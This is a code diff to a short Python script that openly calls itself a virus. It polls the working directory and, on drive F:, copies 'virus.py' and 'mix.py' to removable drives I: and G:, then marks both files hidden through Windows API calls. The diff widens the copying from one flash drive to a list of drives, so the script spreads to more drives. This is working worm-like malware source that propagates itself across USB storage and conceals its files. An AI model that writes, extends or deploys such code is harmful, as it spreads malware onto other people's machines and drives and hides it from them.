@@ -3,23 +3,26 @@ import ctypes
 import time
 import os
 
+flash = ['i:','g:']
 user = os.getlogin()
 timer = 0
 while True:
     time.sleep(3)
     pwd = os.getcwd()
     timer += 1
-    if pwd == 'F:\\': #1
-        try:
-            cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
-            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
-            ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
-            ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
-            print('hidden sucsessful')
-            print('run 1')
-        except:
-            print('error 1')
-            pass
+    if pwd == 'F:\\': #1 
+        for x in flash :
+            try:
+                cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
+                cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
+                ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
+                ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
+                print('hidden sucsessful')
+                print('run 1  ')
+            except:
+                print('error 1')
+                pass
+        
     elif pwd == 'I:\\': #2
         try:
             cp_virus = shutil.copy('virus.py','f:')
